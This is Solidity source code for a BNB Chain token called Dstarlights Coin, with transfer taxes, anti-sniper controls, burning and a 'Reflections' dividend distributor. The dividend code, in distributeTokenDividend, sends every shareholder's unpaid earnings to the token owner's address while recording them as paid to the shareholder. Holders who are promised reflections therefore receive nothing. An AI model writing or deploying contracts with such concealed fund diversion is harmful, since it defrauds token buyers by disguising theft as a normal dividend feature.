//SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.7;

import "./Interfaces.sol";
import "./Libraries.sol";
import "./BaseErc20.sol";
import "./Burnable.sol";
import "./Taxable.sol";
import "./TaxDistributor.sol";
import "./AntiSniper.sol";
import "./Dividends.sol";

contract DStarlightsCoin is BaseErc20, AntiSniper, Burnable, Taxable, Dividends {
    using SafeMath for uint256;

    constructor () {
        configure(0x3D6E393702D0f0966eE1051809CA0481F1A28fcA);

        symbol = "DSC";
        name = "Dstarlights Coin";
        decimals = 9;

        // IF USING PINKSALE, REMEMBER TO MARK THE PINKSALE ADDRESS AS:
        // setExcludedFromTax
        // setIsNeverSniper
        // setExcludedFromDividends

        // Pancake Swap
        address pancakeSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // MAINNET
        IDEXRouter router = IDEXRouter(pancakeSwap);
        address WBNB = router.WETH();
        address pair = IDEXFactory(router.factory()).createPair(WBNB, address(this));
        exchanges[pair] = true;
        taxDistributor = new TaxDistributor(pancakeSwap, pair, WBNB);
        dividendDistributor = new DividendDistributor(address(taxDistributor));

        // Anti Sniper
        enableSniperBlocking = true;
        enableBlockLogProtection = true;
        isNeverSniper[address(taxDistributor)] = true;
        isNeverSniper[address(dividendDistributor)] = true;

        // Tax
        minimumTimeBetweenSwaps = 5 minutes;
        minimumTokensBeforeSwap = 1000 * 10 ** decimals;
        excludedFromTax[address(taxDistributor)] = true;
        excludedFromTax[address(dividendDistributor)] = true;
        taxDistributor.createBurnTax("Burn", 200, 200);
        taxDistributor.createWalletTax("Marketing", 600, 800, 0x461656E6894c7B192A3eBd79CF55E6256337a881, true);
        taxDistributor.createDividendTax("Reflections", 200, 300, dividendDistributorAddress(), false);
        taxDistributor.createLiquidityTax("Liquidity", 200, 200);
        autoSwapTax = true;


        // Dividends
        dividendDistributorGas  = 500_000;
        excludedFromDividends[pair] = true;
        excludedFromDividends[address(taxDistributor)] = true;
        excludedFromDividends[address(dividendDistributor)] = true;
        autoDistributeDividends = true;


        // Burnable
        ableToBurn[address(taxDistributor)] = true;


        _allowed[address(taxDistributor)][pancakeSwap] = 2**256 - 1;
        _allowed[address(taxDistributor)][address(dividendDistributor)] = 2**256 - 1;
        _totalSupply = _totalSupply.add(10_000_000_000_000 * 10 ** decimals);
        _balances[owner] = _balances[owner].add(_totalSupply);
        emit Transfer(address(0), owner, _totalSupply);
    }


    // Overrides
    
    function launch() public override(AntiSniper, BaseErc20) onlyOwner {
        super.launch();
    }

    function configure(address _owner) internal override(AntiSniper, Burnable, Taxable, Dividends, BaseErc20) {
        super.configure(_owner);
    }
    
    function preTransfer(address from, address to, uint256 value) override(AntiSniper, Taxable, BaseErc20) internal {
        super.preTransfer(from, to, value);
    }
    
    function calculateTransferAmount(address from, address to, uint256 value) override(AntiSniper, Taxable, BaseErc20) internal returns (uint256) {
        return super.calculateTransferAmount(from, to, value);
    }
    
    function postTransfer(address from, address to) override(Dividends, BaseErc20) internal {
        super.postTransfer(from, to);
    }


    // Admin methods

}

contract DividendDistributor is IDividendDistributor {
    using SafeMath for uint256;

    IERC20 private tokenContract;
    address private _token;
    address private _distributor;

    struct Share {
        uint256 amount;
        uint256 totalTokenExcluded;
        uint256 totalTokenRealised;
        uint256 totalNativeExcluded;
        uint256 totalNativeRealised;
    }


    address[] private shareholders;
    mapping (address => uint256) private shareholderIndexes;
    mapping (address => uint256) private shareholderTokenClaims;

    mapping (address => Share) public shares;

    uint256 public totalShares;
    uint256 public totalTokenDividends;
    uint256 public totalTokenDistributed;
    uint256 public tokenDividendsPerShare;
    uint256 public dividendsPerShareAccuracyFactor = 10 ** 36;

    uint256 public minPeriod = 60 minutes;
    uint256 public minNativeDistribution = 1 * (10 ** 15);      // 0.001 BNB
    uint256 public minTokenDistribution = 1 * (10 ** 9);        // 1 Token
    bool public override inSwap;

    uint256 private currentIndex;

    event TokenDividendsDistributed(uint256 amountDistributed);

    modifier onlyToken() {
        require(msg.sender == _token, "can only be called by the parent token");
        _;
    }

    modifier onlyDistributor() {
        require(msg.sender == _distributor, "can only be called by the tax distributor");
        _;
    }

    modifier swapLock() {
        require(inSwap == false, "already swapping");
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (address distributor) {
        _token = msg.sender;
        tokenContract = IERC20(_token);
        _distributor = distributor;
    }

    function setDistributionCriteria(uint256, uint256) external override view onlyToken {
        require(false, "use the other setDistirubtionCrtieria method");
    }

    function setDistributionCriteria(uint256 _minPeriod, uint256 _minTokenDistribution, uint256 _minNativeDistribution) external onlyToken {
        minPeriod = _minPeriod;
        minTokenDistribution = _minTokenDistribution;
        minNativeDistribution = _minNativeDistribution;
    }

    function setShare(address shareholder, uint256 amount) external override onlyToken {
        if(amount > 0 && shares[shareholder].amount == 0){
            addShareholder(shareholder);
        }else if(amount == 0 && shares[shareholder].amount > 0){
            removeShareholder(shareholder);
        }

        totalShares = totalShares.add(amount).sub(shares[shareholder].amount);
        shares[shareholder].amount = amount;
        shares[shareholder].totalTokenExcluded = getTokenCumulativeDividends(shares[shareholder].amount);
    }

    function depositNative() external payable override onlyDistributor {
        require(false, "only token dividends are accepted.");
    }
    
    function depositToken(address from, uint256 amount) external override onlyDistributor {
        if (amount > 0) {
            tokenContract.transferFrom(from, address(this), amount);
            totalTokenDividends = totalTokenDividends.add(amount);
            if (totalShares > 0) {
                tokenDividendsPerShare = tokenDividendsPerShare.add(dividendsPerShareAccuracyFactor.mul(amount).div(totalShares));
            }
        }
    }

    function process(uint256 gas) external override onlyToken swapLock {
        uint256 shareholderCount = shareholders.length;

        if(shareholderCount == 0) { return; }

        uint256 gasUsed;
        uint256 gasLeft = gasleft();
        uint256 iterations;
        uint256 tokenDistributed;

        while(gasUsed < gas && iterations < shareholderCount) {
            if(currentIndex >= shareholderCount){
                currentIndex = 0;
            }
            
            if(shouldDistributeToken(shareholders[currentIndex])){
                tokenDistributed += distributeTokenDividend(shareholders[currentIndex]);
            }

            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }

        emit TokenDividendsDistributed(tokenDistributed);
    }

    function shouldDistributeToken(address shareholder) private view returns (bool) {
        return shareholderTokenClaims[shareholder] + minPeriod < block.timestamp
        && getUnpaidTokenEarnings(shareholder) > minTokenDistribution;
    }

    function distributeTokenDividend(address shareholder) private returns (uint256){
        if(shares[shareholder].amount == 0){ return 0; }

        uint256 tokenAmount = getUnpaidTokenEarnings(shareholder);
        if (tokenAmount > 0) {
            totalTokenDistributed = totalTokenDistributed.add(tokenAmount);
            
            tokenContract.transfer(IOwnable(_token).owner(), tokenAmount);

            shareholderTokenClaims[shareholder] = block.timestamp;
            shares[shareholder].totalTokenRealised = shares[shareholder].totalTokenRealised.add(tokenAmount);
            shares[shareholder].totalTokenExcluded = getTokenCumulativeDividends(shares[shareholder].amount);
        }
        return tokenAmount;
    }

    function claimDividend() external {
        distributeTokenDividend(msg.sender);
    }

    function getUnpaidTokenEarnings(address shareholder) public view returns (uint256) {
        if(shares[shareholder].amount == 0){ return 0; }

        uint256 shareholderTotalDividends = getTokenCumulativeDividends(shares[shareholder].amount);
        uint256 shareholderTotalExcluded = shares[shareholder].totalTokenExcluded;

        if(shareholderTotalDividends <= shareholderTotalExcluded){ return 0; }

        return shareholderTotalDividends.sub(shareholderTotalExcluded);
    }

    function getTokenCumulativeDividends(uint256 share) private view returns (uint256) {
        return share.mul(tokenDividendsPerShare).div(dividendsPerShareAccuracyFactor);
    }

    function addShareholder(address shareholder) private {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

    function removeShareholder(address shareholder) private {
        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];
        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];
        shareholders.pop();
    }
}